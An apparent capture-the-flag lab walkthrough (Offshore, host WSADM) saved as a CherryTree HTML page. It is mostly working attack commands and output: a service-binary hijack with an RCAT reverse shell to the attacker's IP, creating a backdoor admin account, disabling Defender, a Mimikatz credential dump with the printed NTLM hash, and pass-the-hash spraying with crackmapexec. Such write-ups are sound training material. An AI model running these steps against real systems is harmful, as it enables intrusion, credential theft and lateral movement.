<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>WSADM - 172.16.1.36</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>WSADM - 172.16.1.36</h1><br/><p><a href="Offshore--WSADM_-_172.16.1.36_11.html#OFS-Flag8">Flag 8</a></p><p><a href="Offshore--WSADM_-_172.16.1.36_11.html#OFS-WSADMCreds">Credentials for 172.16.1.101 / WS02</a></p><p></p><p>RDP into WSADM</p><p><code><span style="background-color:#000000;">xfreerdp /v:172.16.1.36 /u:ned.flanders_adm /p:Lefthandedyeah! /drive:tools,/home/user/Documents /dynamic-resolution</span></code></p><p></p><p>Check for unquoted services</p><p><code><span style="background-color:#000000;">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; | findstr /i /v &quot;C:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span></code></p><p></p><p>We get a hit</p><p></p><p><img src="images/11-1.png" alt="images/11-1.png" /></p><p></p><p>We have write permission to the main executable binary C:\Program Files (x86)\Lavasoft\Web Companion\Application</p><p>Let&#39;s hijack the executable and privesc through that</p><p></p><p>Use winpayloads - download with</p><p>To get around Windows Defender, I use RCAT</p><p><a href="https://github.com/xct/rcat">https://github.com/xct/rcat</a></p><p></p><p>The issue here though is we have to replace the exe for the service but call RCAT with our IP and Port as parameters.</p><p>To do this, I used <a href="https://bat-to-exe-converter-x64.en.softonic.com/?ex=DINS-635.0">Bat-to-Exe Converter</a></p><p></p><p>Just put RCAT.exe in C:\temp, make an EXE with the converter with just 1 line</p><p><code><span style="background-color:#000000;">C:\temp\rcat.exe connect 10.10.16.94 4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code>Take the EXE you generated with the 1 line, copy it to WSADM.  Name it Lavasoft.WCAssistant.WinService.exe and copy it to C:\Program Files (x86)\Lavasoft\Web Companion\Application\</p><p></p><p>Start your listener on your attack host</p><p><code><span style="background-color:#000000;">└─$ ./rcat listen 10.10.16.94 4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Listening on 10.10.16.94:4444</span></code></p><p></p><p>Run the command to start the service</p><p><code><span style="background-color:#000000;">C:\Users\ned.flanders_adm&gt;sc.exe start WCAssistantService</span></code></p><p><code><span style="background-color:#000000;">[SC] StartService FAILED 1053:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">The service did not respond to the start or control request in a timely fashion.</span></code></p><p></p><p>It will hang a little but eventually say it failed to start</p><p></p><p>Check and it should have connected to our listener</p><p><code><span style="background-color:#000000;">└─$ ./rcat listen 10.10.16.94 4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Listening on 10.10.16.94:4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Connection from 10.10.110.3:12606</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Windows PowerShell </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Copyright (C) Microsoft Corporation. All rights reserved.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\Windows\system32&gt; whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">nt authority\system</span></code></p><p></p><p>Grab the root flag</p><p></p><p><code><span style="background-color:#000000;">PS C:\users\wsadmin\desktop&gt; type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag8"></a>OFFSHORE{4t_y0ur_5erv1ce}</p><p></p><p>Put a local admin so we can do a little more</p><p><code><span style="background-color:#000000;">net user merlin Password123! /add</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">net localgroup administrators merlin /add</span></code></p><p></p><p>Switch RDP over to this user</p><p><code><span style="background-color:#000000;">xfreerdp /v:172.16.1.36 /u:merlin /p:Password123! /drive:tools,/home/user/Documents /dynamic-resolution</span></code></p><p></p><p></p><p>Turn off Windows Defender so we can use fun tools (start Powershell administratively)</p><p><code><span style="background-color:#000000;">powershell set-mppreference -disablerealtimemonitoring $true</span></code></p><p></p><p>Mimikatz needs the highest credentials (nt authority\system) to be able to dump passwords</p><p>To get this, upload PsExec64.exe </p><p></p><p>Open cmd.exe administratively (right click -&gt; run as administrator)</p><p></p><p>Then run </p><p><code><span style="background-color:#000000;">PsExec64.exe -s -i cmd.exe</span></code></p><p></p><p>Then we have nt authority\system and can run mimikatz.exe</p><p> </p><p><code><span style="background-color:#000000;"> mimikatz.exe “log” “privilege::debug” “sekurlsa::logonpasswords full” “exit”</span></code></p><p> </p><p> Check the log file for any results</p><p></p><p><code><span style="background-color:#000000;">	 * Username : wsadmin</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">	 * Domain   : CORP</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">	 * NTLM     : 669b12a3bac275251170afbe2c5de8c2</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">	 * SHA1     : 62e3e767c5d2ad6521d8d3e0e672e299437ed666</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">	 * DPAPI    : 41aff401de68a7ae9e94bdb6907dddb2</span></code></p><p>	</p><p>Let&#39;s nmap and see what other hosts there are so we can spray these creds to see where to move to next</p><p></p><p><code><span style="background-color:#000000;">└─$ nmap -sn 172.16.1.0/24 -oN corp.pingsweep.txt</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ grep -Eo &#39;[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+&#39; corp.pingsweep.txt | awk &#39;{print $1}&#39; &gt; corp_ip_list.txt </span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ cat corp_ip_list.txt </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.5</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.15</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.23</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.24</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.26</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.30</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.36</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.101</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.200</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.201</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">172.16.1.220</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ crackmapexec smb corp_ip_list.txt -u wsadmin -H 669b12a3bac275251170afbe2c5de8c2 -d corp.local</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/home/user/.pyenv/versions/3.8.1/lib/python3.8/site-packages/paramiko/transport.py:219: CryptographyDeprecationWarning: Blowfish has been deprecated</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  &quot;class&quot;: algorithms.Blowfish,</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.15     445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:corp.local) (signing:False) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.220    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:corp.local) (signing:True) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:corp.local) (signing:False) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.30     445    MS01             [*] Windows Server 2016 Standard 14393 x64 (name:MS01) (domain:corp.local) (signing:False) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.26     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:corp.local) (signing:False) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.24     445    WEB-WIN01        [*] Windows 10.0 Build 14393 x64 (name:WEB-WIN01) (domain:corp.local) (signing:False) (SMBv1:False)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.200    445    DC0              [*] Windows 10.0 Build 17763 x64 (name:DC0) (domain:corp.local) (signing:True) (SMBv1:False)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.201    445    JOE-LPTP         [*] Windows 10.0 Build 19041 x64 (name:JOE-LPTP) (domain:corp.local) (signing:False) (SMBv1:False)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.36     445    WSADM            [*] Windows 10.0 Build 17134 x64 (name:WSADM) (domain:corp.local) (signing:False) (SMBv1:False)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.15     445    SQL01            [+] corp.local\wsadmin 669b12a3bac275251170afbe2c5de8c2 </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SMB         172.16.1.220    445    SRV01            [-] corp.local\wsadmin:669b12a3bac275251170afbe2c5de8c2 STATUS_LOGON_FAILURE </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-WSADMCreds"></a><strong><span style="color:#ed333b;">SMB         172.16.1.101    445    WS02             [+] corp.local\wsadmin 669b12a3bac275251170afbe2c5de8c2 (Pwn3d!)</span></strong></p><p>SMB         172.16.1.30     445    MS01             [+] corp.local\wsadmin 669b12a3bac275251170afbe2c5de8c2 </p><p>SMB         172.16.1.26     445    FS01             [+] corp.local\wsadmin 669b12a3bac275251170afbe2c5de8c2 </p><p>SMB         172.16.1.5      445    DC01             [+] corp.local\wsadmin 669b12a3bac275251170afbe2c5de8c2 </p><p>SMB         172.16.1.24     445    WEB-WIN01        [+] corp.local\wsadmin 669b12a3bac275251170afbe2c5de8c2 </p><p>SMB         172.16.1.200    445    DC0              [-] corp.local\wsadmin:669b12a3bac275251170afbe2c5de8c2 STATUS_LOGON_FAILURE </p><p>SMB         172.16.1.201    445    JOE-LPTP         [-] corp.local\wsadmin:669b12a3bac275251170afbe2c5de8c2 STATUS_LOGON_FAILURE </p><p>SMB         172.16.1.36     445    WSADM            [+] corp.local\wsadmin 669b12a3bac275251170afbe2c5de8c2 (Pwn3d!)</p><p></p><p></p><p>Lastly while we&#39;re on this machine with domain credentials, let&#39;s snag a Bloodhound dump</p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; . .\SharpHound.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; Invoke-Bloodhound -collectionmethod All -domain corp.local</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:19:50.6417253-04:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:19:50.8292277-04:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:19:50.8448507-04:00|INFORMATION|Initializing SharpHound at 8:19 PM on 5/1/2023</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:19:51.3604817-04:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:19:51.5636028-04:00|INFORMATION|Beginning LDAP search for corp.local</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:19:51.6731189-04:00|INFORMATION|Producer has finished, closing LDAP channel</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:19:51.6731189-04:00|INFORMATION|LDAP channel closed, waiting for consumers</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:20:37.4070011-04:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 92 MB RAM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:20:40.4070004-04:00|INFORMATION|Consumers finished, closing output channel</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:20:40.4539969-04:00|INFORMATION|Output channel closed, waiting for output task to complete</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Closing writers</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:20:40.6100732-04:00|INFORMATION|Status: 356 objects finished (+356 7.265306)/s -- Using 142 MB RAM</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:20:40.6100732-04:00|INFORMATION|Enumeration finished in 00:00:49.0547312</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:20:40.7201222-04:00|INFORMATION|Saving cache with stats: 315 ID to type mappings.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 322 name to SID mappings.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 0 machine sid mappings.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 2 sid to domain mappings.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"> 0 global catalog mappings.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-01T20:20:40.7350684-04:00|INFORMATION|SharpHound Enumeration Completed at 8:20 PM on 5/1/2023! Happy Graphing!</span></code></p><p></p><p></p></div>
</body>
</html>
